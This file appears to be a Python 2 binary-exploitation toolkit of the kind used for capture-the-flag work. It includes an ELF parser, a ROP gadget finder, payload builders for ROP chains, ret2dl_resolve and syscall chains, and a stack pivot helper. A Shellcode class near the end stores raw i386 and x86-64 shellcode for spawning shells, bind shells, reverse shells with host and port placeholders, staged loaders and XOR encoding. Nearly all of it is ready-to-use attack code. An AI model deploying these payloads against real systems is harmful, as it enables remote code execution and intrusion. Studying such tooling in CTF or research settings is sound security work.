#!/usr/bin/env python

import sys
import os
import re
import struct
import socket
import time
import fcntl
import select
import random
import tempfile
from telnetlib import Telnet
from subprocess import Popen, PIPE
from contextlib import contextmanager


def int16(x):
    return int(x, 16)

def p32(x):
    if isinstance(x, str):
        return struct.unpack('<I', x)[0]
    elif isinstance(x, (list, tuple)):
        return struct.pack('<' + ('I'*len(x)), *x)
    else:
        return struct.pack('<I', x)

def p64(x):
    if isinstance(x, str):
        return struct.unpack('<Q', x)[0]
    elif isinstance(x, (list, tuple)):
        return struct.pack('<' + ('Q'*len(x)), *x)
    else:
        return struct.pack('<Q', x)


class ELF:
    def __init__(self, fpath, base=0):
        self.fpath = fpath
        self.base = base
        self.sec = dict(relro=False, bind_now=False, stack_canary=False, nx=False, pie=False, rpath=False, runpath=False, dt_debug=False)

        if not os.path.exists(fpath):
            raise Exception("file not found: %r" % fpath)

        self._entry_point = None
        self._section = {}
        self._dynamic = {}
        self._got = {}
        self._plt = {}
        self._symbol = {}
        self._load_blobs = []

        regexp = {
            'section': r'^\s*\[(?P<Nr>[^\]]+)\]\s+(?P<Name>\S+)\s+(?P<Type>\S+)\s+(?P<Address>\S+)\s+(?P<Off>\S+)\s+(?P<Size>\S+)\s+(?P<ES>\S+)\s+(?P<Flg>\S+)\s+(?P<Lk>\S+)\s+(?P<Inf>\S+)\s+(?P<Al>\S+)$',
            'program': r'^\s*(?P<Type>\S+)\s+(?P<Offset>\S+)\s+(?P<VirtAddr>\S+)\s+(?P<PhysAddr>\S+)\s+(?P<FileSiz>\S+)\s+(?P<MemSiz>\S+)\s+(?P<Flg>.{3})\s+(?P<Align>\S+)$',
            'dynamic': r'^\s*(?P<Tag>\S+)\s+\((?P<Type>[^)]+)\)\s+(?P<Value>.+)$',
            'reloc': r'^\s*(?P<Offset>\S+)\s+(?P<Info>\S+)\s+(?P<Type>\S+)\s+(?P<Value>\S+)\s+(?P<Name>\S+)(?: \+ (?P<AddEnd>\S+))?$',
            'symbol': r'^\s*(?P<Num>[^:]+):\s+(?P<Value>\S+)\s+(?P<Size>\S+)\s+(?P<Type>\S+)\s+(?P<Bind>\S+)\s+(?P<Vis>\S+)\s+(?P<Ndx>\S+)\s+(?P<Name>\S+)',
        }
        plt_stub_size = 0x10
        has_dynamic_section = True
        has_symbol_table = True

        p = Popen(['readelf', '-W', '-a', fpath], stdout=PIPE)
        # read ELF Header
        while True:
            line = p.stdout.readline()
            if line == 'Section Headers:\n':
                break
            m = re.search(r'^\s*(?P<key>[^:]+):\s+(?P<value>.+)$', line)
            if not m:
                continue
            key, value = m.group('key', 'value')
            if key == 'Class':
                if value == 'ELF64':
                    self.wordsize = 8
                elif value == 'ELF32':
                    self.wordsize = 4
                else:
                    raise Exception("unsupported ELF class: %s" % value)
            elif key == 'Type':
                if value == 'DYN (Shared object file)':
                    self.sec['pie'] = True
            elif key == 'Entry point address':
                self._entry_point = int16(value)
        # read Section Headers
        while True:
            line = p.stdout.readline()
            if line == 'Program Headers:\n':
                break
            m = re.search(regexp['section'], line)
            if not m or m.group('Nr') == 'Nr':
                continue
            name = m.group('Name')
            address, size = map(int16, m.group('Address', 'Size'))
            self._section[name] = (address, size)
        # read Program Headers
        while True:
            line = p.stdout.readline()
            if line.startswith('Dynamic section'):
                has_dynamic_section = True
                break
            elif line == 'There is no dynamic section in this file.\n':
                has_dynamic_section = False
                break
            m = re.search(regexp['program'], line)
            if not m or m.group('Type') == 'Type':
                continue
            type_, flg = m.group('Type', 'Flg')
            offset, virtaddr, filesiz = map(int16, m.group('Offset', 'VirtAddr', 'FileSiz'))
            if type_ == 'GNU_RELRO':
                self.sec['relro'] = True
            elif type_ == 'GNU_STACK':
                if not 'E' in flg:
                    self.sec['nx'] = True
            elif type_ == 'LOAD':
                with open(fpath, 'rb') as f:
                    f.seek(offset)
                    blob = f.read(filesiz)
                is_executable = ('E' in flg)
                self._load_blobs.append((virtaddr, blob, is_executable))
        # read Dynamic section
        while has_dynamic_section:
            line = p.stdout.readline()
            if line.startswith('Relocation section') and '.plt' in line:
                break
            m = re.search(regexp['dynamic'], line)
            if not m or m.group('Tag') == 'Tag':
                continue
            type_, value = m.group('Type', 'Value')
            if type_ == 'BIND_NOW':
                self.sec['bind_now'] = True
            elif type_ == 'RPATH':
                self.sec['rpath'] = True
            elif type_ == 'RUNPATH':
                self.sec['runpath'] = True
            elif type_ == 'DEBUG':
                self.sec['dt_debug'] = True
            if value.startswith('0x'):
                self._dynamic[type_] = int16(value)
            elif value.endswith(' (bytes)'):
                self._dynamic[type_] = int(value.split()[0])
        # read Relocation section (.rel.plt/.rela.plt)
        while True:
            line = p.stdout.readline()
            if line.startswith('Symbol table'):
                has_symbol_table = True
                break
            elif line == 'No version information found in this file.\n':
                has_symbol_table = False
                break
            m = re.search(regexp['reloc'], line)
            if not m or m.group('Offset') == 'Offset':
                continue
            type_, name = m.group('Type', 'Name')
            offset = int16(m.group('Offset'))
            if not type_.endswith('JUMP_SLOT'):
                continue
            self._got[name] = offset
            self._plt[name] = self._section['.plt'][0] + (plt_stub_size * (len(self._plt)+1))
            if name == '__stack_chk_fail':
                self.sec['stack_canary'] = True
        # read Symbol table
        while has_symbol_table:
            line = p.stdout.readline()
            if line.startswith('Version symbols section') or line == 'No version information found in this file.\n':
                break
            m = re.search(regexp['symbol'], line)
            if not m or m.group('Num') == 'Num':
                continue
            if m.group('Ndx') == 'UND':
                continue
            name, value = m.group('Name'), int16(m.group('Value'))
            self._symbol[name] = value
            if '@@' in name:
                default_name = name.split('@@')[0]
                self._symbol[default_name] = value
        p.wait()

    def p(self, x):
        if self.wordsize == 8:
            return p64(x)
        else:
            return p32(x)

    def set_base(self, addr, ref_symbol=None):
        self.base = addr
        if ref_symbol:
            self.base -= self._symbol[ref_symbol]

    def section(self, name):
        return self.base + self._section[name][0]

    def dynamic(self, name):
        return self.base + self._dynamic[name]

    def got(self, name=None):
        if name:
            return self.base + self._got[name]
        else:
            return self.dynamic('PLTGOT')

    def plt(self, name=None):
        if name:
            return self.base + self._plt[name]
        else:
            return self.base + self._section['.plt'][0]

    def addr(self, name):
        return self.base + self._symbol[name]

    def str(self, name):
        return self.search(name + '\x00')

    def search(self, s, xonly=False, regexp=False):
        if not isinstance(s, str):
            s = self.p(s)

        for virtaddr, blob, is_executable in self._load_blobs:
            if xonly and not is_executable:
                continue
            if regexp:
                m = re.search(s, blob)
                if m:
                    return self.base + virtaddr + m.start()
            else:
                try:
                    i = blob.index(s)
                    return self.base + virtaddr + i
                except ValueError:
                    pass
        else:
            raise ValueError()

    def gadget(self, keyword, reg=None, n=1):
        table = {
            'pushad': '\x60\xc3',  # i386 only
            'popad': '\x61\xc3',   # i386 only
            'leave': '\xc9\xc3',
            'ret': '\xc3',
            'int3': '\xcc',
            'int0x80': '\xcd\x80',
            'call_gs': '\x65\xff\x15\x10\x00\x00\x00',
            'syscall': '\x0f\x05',
        }
        if keyword in table:
            return self.search(table[keyword], xonly=True)

        regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
        if reg:
            try:
                r = regs.index('r'+reg[1:])
            except ValueError:
                raise Exception("unexpected register: %r" % reg)
        else:
            r = regs.index('rsp')

        if keyword == 'pop':
            if reg:
                if r >= 8:
                    chunk = '\x41' + chr(0x58+(r-8)) + '\xc3'
                else:
                    chunk = chr(0x58+r) + '\xc3'
                return self.search(chunk, xonly=True)
            else:
                # skip rsp
                return self.search(r"(?:[\x58-\x5b\x5d-\x5f]|\x41[\x58-\x5f]){%d}\xc3" % n, xonly=True, regexp=True)
        elif keyword == 'jmp':
            if r >= 8:
                chunk = '\x41\xff' + chr(0xe0+(r-8))
            else:
                chunk = '\xff' + chr(0xe0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'call':
            if r >= 8:
                chunk = '\x41\xff' + chr(0xd0+(r-8))
            else:
                chunk = '\xff' + chr(0xd0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'push':
            if r >= 8:
                chunk = '\x41' + chr(0x50+(r-8)) + '\xc3'
            else:
                chunk = chr(0x50+r) + '\xc3'
            return self.search(chunk, xonly=True)
        elif keyword == 'pivot':
            # chunk1: xchg REG, rsp
            # chunk2: xchg rsp, REG
            if r >= 8:
                chunk1 = '\x49\x87' + chr(0xe0+(r-8)) + '\xc3'
                chunk2 = '\x4c\x87' + chr(0xc4+8*(r-8)) + '\xc3'
            elif reg[0] == 'r':
                if r == 0:
                    chunk1 = '\x48\x94\xc3'
                else:
                    chunk1 = '\x48\x87' + chr(0xe0+r) + '\xc3'
                chunk2 = '\x48\x87' + chr(0xc4+8*r) + '\xc3'
            else:
                if r == 0:
                    chunk1 = '\x94\xc3'
                else:
                    chunk1 = '\x87' + chr(0xe0+r) + '\xc3'
                chunk2 = '\x87' + chr(0xc4+8*r) + '\xc3'
            return self.search("(?:%s|%s)" % (chunk1, chunk2), xonly=True, regexp=True)
        else:
            # search directly
            return self.search(keyword, xonly=True)

    def checksec(self):
        result = ''
        if self.sec['relro']:
            result += '\033[32mFull RELRO   \033[m   ' if self.sec['bind_now'] else '\033[33mPartial RELRO\033[m   '
        else:
            result += '\033[31mNo RELRO     \033[m   '
        result += '\033[32mCanary found   \033[m   ' if self.sec['stack_canary'] else '\033[31mNo canary found\033[m   '
        result += '\033[32mNX enabled \033[m   ' if self.sec['nx'] else '\033[31mNX disabled\033[m   '
        result += '\033[32mPIE enabled  \033[m   ' if self.sec['pie'] else '\033[31mNo PIE       \033[m   '
        result += '\033[31mRPATH    \033[m  ' if self.sec['rpath'] else '\033[32mNo RPATH \033[m  '
        result += '\033[31mRUNPATH    \033[m  ' if self.sec['runpath'] else '\033[32mNo RUNPATH \033[m  '
        result += self.fpath

        print 'RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE'
        print result

    def list_gadgets(self):
        if self.wordsize == 8:
            regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
        else:
            regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

        print "%8s" % 'pop',
        for i in range(6):
            try:
                self.gadget('pop', n=i+1)
                print "\033[32m%d\033[m" % (i+1),
            except ValueError:
                print "\033[31m%d\033[m" % (i+1),
        print

        for keyword in ['pop', 'jmp', 'call', 'push', 'pivot']:
            print "%8s" % keyword,
            for reg in regs:
                try:
                    self.gadget(keyword, reg)
                    print "\033[32m%s\033[m" % reg,
                except ValueError:
                    print "\033[31m%s\033[m" % reg,
            print

        print "%8s" % 'etc',
        for keyword in ['pushad', 'popad', 'leave', 'ret', 'int3', 'int0x80', 'call_gs', 'syscall']:
            try:
                self.gadget(keyword)
                print "\033[32m%s\033[m" % keyword,
            except ValueError:
                print "\033[31m%s\033[m" % keyword,
        print

    def scan_gadgets(self, chunk, pos=0):
        for virtaddr, blob, is_executable in self._load_blobs:
            if not is_executable:
                continue

            i = -1
            while True:
                try:
                    i = blob.index(chunk, i+1)
                except ValueError:
                    break

                p = Popen(['objdump', '-w', '-M', 'intel', '-D', "--start-address=%d" % (virtaddr+i-pos), self.fpath], stdout=PIPE)
                stdout, stderr = p.communicate()

                print
                for line in stdout.splitlines()[6:]:
                    if not line:
                        break
                    print line
                    if '(bad)' in line:
                        break

    def objdump(self):
        p = Popen(['objdump', '-M', 'intel', '-d', self.fpath], stdout=PIPE)
        stdout, stderr = p.communicate()

        p = Popen(['strings', '-tx', fpath], stdout=PIPE)
        rev_string = dict((int16(line[:7].strip()), line[8:-1]) for line in p.stdout)
        p.wait()

        rev_symbol = {}
        rev_plt = {}
        for k, v in self._symbol.iteritems():
            rev_symbol.setdefault(v, []).append(k)
        for k, v in self._plt.iteritems():
            rev_plt.setdefault(v, []).append(k)

        lines = []
        labels = {}
        code_xrefs = {}
        data_xrefs = {}

        # collect addresses
        for line in stdout.splitlines():
            ary = line.strip().split(':', 1)
            try:
                addr, expr = int16(ary[0]), ary[1]
                labels[addr] = None
            except ValueError:
                addr, expr = None, None
            lines.append((line, addr, expr))

        # collect references
        for line, addr, expr in lines:
            if addr is None:
                continue

            if addr == self._entry_point:
                labels[addr] = '_start'

            m = re.search(r'call\s+(?:0x)?([\dA-Fa-f]+)\b', line)
            if m:
                ref = int16(m.group(1))
                labels[ref] = "sub_%x" % ref
                code_xrefs.setdefault(ref, set()).add(addr)

            m = re.search(r'j\w{1,2}\s+(?:0x)?([\dA-Fa-f]+)\b', line)
            if m:
                ref = int16(m.group(1))
                labels[ref] = "loc_%x" % ref
                code_xrefs.setdefault(ref, set()).add(addr)

            for m in re.finditer(r',0x([\dA-Fa-f]{3,})\b', expr):
                ref = int16(m.group(1))
                if ref in labels:
                    labels[ref] = "loc_%x" % ref
                    data_xrefs.setdefault(ref, set()).add(addr)

        for k, v in code_xrefs.iteritems():
            code_xrefs[k] = sorted(list(v))
        for k, v in data_xrefs.iteritems():
            data_xrefs[k] = sorted(list(v))

        # output with annotations
        def repl_func1(addr, color):
            def _f(m):
                ref = int16(m.group(2))
                return "\x1b[%dm%s%s [%+#x]\x1b[0m" % (color, m.group(1), labels[ref], ref-addr)
            return _f

        def repl_func2(color):
            def _f(m):
                addr = int16(m.group(1))
                if addr in labels and not addr in rev_symbol:
                    return ",\x1b[%dm%s\x1b[0m" % (color, labels[addr])
                else:
                    return m.group(0)
            return _f

        arrows = {}
        for k, v in [(True, u'\u25b2'), (False, u'\u25bc')]:
            arrows[k] = v.encode('utf-8')

        for line, addr, expr in lines:
            if addr is None:
                print line
                continue

            line = re.sub(r'(call\s+)[\dA-Fa-f]+\s+<([\w@\.]+)>', '\x1b[33m\\1\\2\x1b[0m', line)
            line = re.sub(r'(call\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr, 33), line)
            line = re.sub(r'(j\w{1,2}\s+)[\dA-Fa-f]+\s+<([\w@\.]+)>', '\x1b[32m\\1\\2\x1b[0m', line)
            line = re.sub(r'(j\w{1,2}\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr, 32), line)
            line = re.sub(r',0x([\dA-Fa-f]{3,})\b', repl_func2(36), line)

            expr = line.split(':', 1)[1]

            label = ''
            if labels[addr]:
                if not addr in rev_symbol and not addr in rev_plt:
                    if labels[addr].startswith('loc_'):
                        color = 32
                    else:
                        color = 33
                    label += "\x1b[%dm%s:\x1b[0m" % (color, labels[addr])
                    label = label.ljust(78+9)
                else:
                    label = label.ljust(78)
                if addr in code_xrefs:
                    ary = ["%x%s" % (x, arrows[x < addr]) for x in code_xrefs[addr]]
                    label += " \x1b[32m; CODE XREF: %s\x1b[0m" % ', '.join(ary)
                if addr in data_xrefs:
                    ary = ["%x%s" % (x, arrows[x < addr]) for x in data_xrefs[addr]]
                    label += " \x1b[36m; DATA XREF: %s\x1b[0m" % ', '.join(ary)
                if addr == self._entry_point:
                    label += ' \x1b[33m; ENTRY POINT\x1b[0m'
            if label:
                print label

            annotations = []
            for m in re.finditer(r'([\dA-Fa-f]{3,})\b', expr):
                ref = int16(m.group(1))

                if 0 <= ref - self._section['.data'][0] < self._section['.data'][1]:
                    annotations.append('[.data]')
                elif 0 <= ref - self._section['.bss'][0] < self._section['.bss'][1]:
                    annotations.append('[.bss]')

                if ref in rev_symbol:
                    annotations.append(', '.join(rev_symbol[ref]))

                for virtaddr, blob, is_exebutable in self._load_blobs:
                    offset = ref - virtaddr
                    if offset in rev_string:
                        annotations.append(repr(rev_string[offset]))
                        break

            if annotations:
                print "%-70s \x1b[30;1m; %s\x1b[0m" % (line, ' '.join(annotations))
            else:
                print line

            if 'ret' in line:
                print "\x1b[30;1m; %s\x1b[0m" % ('-' * 78)


class ROP(ELF):
    def call(self, addr, *args):
        if isinstance(addr, str):
            addr = self.plt(addr)

        if self.wordsize == 8:
            regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
            buf = ''
            for i, arg in enumerate(args):
                buf += self.p([self.gadget('pop', regs[i]), arg])
            buf += self.p(addr)
            buf += self.p(args[6:])
            return buf
        else:
            buf = self.p(addr)
            buf += self.p(self.gadget('pop', n=len(args)))
            buf += self.p(args)
            return buf

    def call_chain_ptr(self, *calls, **kwargs):
        if self.wordsize != 8:
            raise Exception('support x86-64 only')

        gadget_candidates = [
            # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
            # Ubuntu clang version 3.0-6ubuntu3 (tags/RELEASE_30/final) (based on LLVM 3.0)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-4)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x72\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc 4.8.2-19ubuntu1
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', True),
            # gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3', True),
        ]

        for chunk1, chunk2, _args_reversed in gadget_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_r12 = self.gadget(chunk1 + chunk2)
                args_reversed = _args_reversed
                break
            except ValueError:
                pass
        else:
            raise Exception('gadget not found')

        buf = p64(set_regs)

        for args in calls:
            if len(args) > 4:
                raise Exception('4th argument and latter should be set in advance')
            elif args[1] >= (1<<32):
                raise Exception("1st argument should be less than 2^32: %x" % args[1])

            ptr = args.pop(0)
            if isinstance(ptr, str):
                ptr = self.got(ptr)

            buf += self.junk()
            buf += p64(0) + p64(1) + p64(ptr)
            if not args_reversed:
                for arg in args:
                    buf += p64(arg)
                buf += self.junk(3-len(args))
            else:
                buf += self.junk(3-len(args))
                for arg in reversed(args):
                    buf += p64(arg)
            buf += p64(call_r12)

        buf += self.junk()
        if 'pivot' in kwargs:
            buf += p64(0)
            buf += p64(kwargs['pivot'] - self.wordsize)
            buf += p64(0) * 4
            buf += p64(self.gadget('leave'))
        else:
            buf += p64(0) * 6
        return buf

    def dl_resolve(self, base, name, *args, **kwargs):
        def align(x, origin, size):
            pad = size - ((x-origin) % size)
            return (x+pad, pad)

        if self.wordsize == 8:
            jmprel = self.dynamic('JMPREL')
            relaent = self.dynamic('RELAENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            # prerequisite:
            # 1) overwrite (link_map + 0x1c8) with NULL
            # 2) set registers for arguments
            addr_reloc, pad_reloc = align(base + self.wordsize*3, jmprel, relaent)
            addr_sym, pad_sym = align(addr_reloc + 0x18, symtab, syment)
            addr_symstr = addr_sym + syment
            addr_end = addr_symstr + len(name) + 1

            reloc_offset = (addr_reloc - jmprel) / relaent
            r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
            st_name = addr_symstr - strtab

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            buf += self.p(kwargs.get('retaddr', addr_end))
            buf += self.fill(pad_reloc)
            buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
            buf += self.fill(pad_sym)
            buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
            buf += self.string(name)
        else:
            jmprel = self.dynamic('JMPREL')
            relent = self.dynamic('RELENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            arg_values = self.p(args)

            addr_reloc, pad_reloc = align(base + self.wordsize*3 + len(arg_values), jmprel, relent)
            addr_sym, pad_sym = align(addr_reloc+relent, symtab, syment)
            addr_symstr = addr_sym + syment
            addr_end = addr_symstr + len(name) + 1

            reloc_offset = addr_reloc - jmprel
            r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
            st_name = addr_symstr - strtab

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            buf += self.p(kwargs.get('retaddr', addr_end))
            buf += arg_values
            buf += self.fill(pad_reloc)
            buf += struct.pack('<II', self.section('.bss'), r_info)      # Elf32_Rel
            buf += self.fill(pad_sym)
            buf += struct.pack('<IIII', st_name, 0, 0, 0x12)             # Elf32_Sym
            buf += self.string(name)

        return buf

    def syscall(self, number, *args):
        if self.wordsize == 8:
            arg_regs = ['rdi', 'rsi', 'rdx', 'r10', 'r8', 'r9']
            buf = self.p([self.gadget('pop', 'rax'), number])
            for arg_reg, arg in zip(arg_regs, args):
                buf += self.p([self.gadget('pop', arg_reg), arg])
            buf += self.p(self.gadget('syscall'))
        else:
            try:
                # popad = pop edi, esi, ebp, esp, ebx, edx, ecx, eax
                args = list(args) + [0] * (6-len(args))
                buf = self.p([self.gadget('popad'), args[4], args[3], args[5], 0, args[0], args[2], args[1], number])
            except ValueError:
                arg_regs = ['ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp']
                buf = self.p([self.gadget('pop', 'eax'), number])
                for arg_reg, arg in zip(arg_regs, args):
                    buf += self.p([self.gadget('pop', arg_reg), arg])
            buf += self.p(self.gadget('int0x80'))
        return buf

    def pivot(self, rsp):
        buf = self.p([self.gadget('pop', 'rbp'), rsp-self.wordsize])
        buf += self.p(self.gadget('leave'))
        return buf

    def string(self, s):
        return s + '\x00'

    def junk(self, n=1):
        return self.fill(self.wordsize * n)

    def fill(self, size, buf=''):
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        return ''.join(random.choice(chars) for i in xrange(buflen))

    def retfill(self, size, buf=''):
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        s = self.fill(buflen % self.wordsize)
        s += self.p(self.gadget('ret')) * (buflen // self.wordsize)
        return s

    def derive(self, blob, base=0):
        return ROPBlob(blob, self.wordsize, base)


class ROPBlob(ROP):
    def __init__(self, blob, wordsize, base=0):
        self._load_blobs = [(0, blob, True)]
        self.wordsize = wordsize
        self.base = base


class Shellcode:
    _database = {
        'i386': {
            'noppairs': ['AI', 'BJ', 'CK', 'FN', 'GO'],
            'exec_shell': '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
            'exec_command': '\xeb\x29\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80\xe8\xd2\xff\xff\xff',
            'dup': '\x31\xd2\x8d\x5a${fd}\x8d\x4a\x02\x8d\x42\x3f\xcd\x80\x49\x7d\xf8',
            'cat': '\xeb\x21\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff',
            'read_stager': '\xeb\x0f\x59\x6a\x03\x58\x99\x89\xd3\x42\xc1\xe2\x0c\xcd\x80\xff\xe1\xe8\xec\xff\xff\xff',
            'mmap_stager': '\x6a\x5a\x58\x99\x89\xd1\x42\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\xcd\x80\x91\x93\x8d\x43\x03\xcd\x80\xff\xe1',
            'alnum_stager': 'Yh3333k4dsFkDqG02DqH0D10u03P3H1o0j2B0207393s3q103a8P7l3j4s3B065k3O4N8N8O03',
            'bind_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x66\x68${port}\x66\x6a\x02\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
            'reverse_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68${host}\x66\x68${port}\x66\x6a\x02\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80',
            'xor': '\xeb\x09\x5e\x80\x36${key}\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff',
        },
        'x86-64': {
            'noppairs': ['PX', 'QY', 'RZ'],
            'exec_shell': '\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'exec_command': '\xeb\x31\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x52\x66\x68\x2d\x63\x48\x89\xe3\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x56\x53\x57\x48\x89\xe6\x0f\x05\xe8\xca\xff\xff\xff',
            'dup': '\x6a${fd}\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x7d\xf6',
            'cat': '\xeb\x28\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x52\x57\x48\x89\xe7\x52\x56\x57\x48\x89\xe6\x0f\x05\xe8\xd3\xff\xff\xff',
            'read_stager': '\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xff\xe6\xe8\xe8\xff\xff\xff',
            'mmap_stager': '\x4d\x31\xc9\x6a\xff\x41\x58\x6a\x22\x41\x5a\x6a\x07\x5a\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x48\x31\xff\x6a\x09\x58\x0f\x05\x48\x96\x48\x92\x48\x31\xc0\x0f\x05\xff\xe6',
            'alnum_stager': 'h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M367p0h1O0A8O7p5L2x01193i4m7k08144L7m1M3K043I3A8L4V8K0m',
            'bind_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xba\xf2\xff${port}\x66\x83\xf2\xf0\x52\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'reverse_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68${host}\x66\x68${port}\x66\x6a\x02\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'xor': '\xeb\x0c\x5e\x80\x36${key}\x74\x0b\x48\xff\xc6\xeb\xf6\x90\xe8\xef\xff\xff\xff',
        }
    }

    def __init__(self, arch):
        if arch not in self._database:
            raise Exception("unsupported architechture: %r" % arch)
        self.arch = arch

    def nopfill(self, code, size, buf=''):
        noppairs = self._database[self.arch]['noppairs']
        buflen = size - len(buf) - len(code)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        buf = ''
        while len(buf) < buflen:
            buf += random.choice(noppairs)
        return buf[:buflen] + code

    def exec_shell(self):
        return self._database[self.arch]['exec_shell']

    def exec_command(self, command):
        return self._database[self.arch]['exec_command'] + chr(len(command)) + command

    def dup(self, code, fd):
        return self._database[self.arch]['dup'].replace('${fd}', chr(fd)) + code

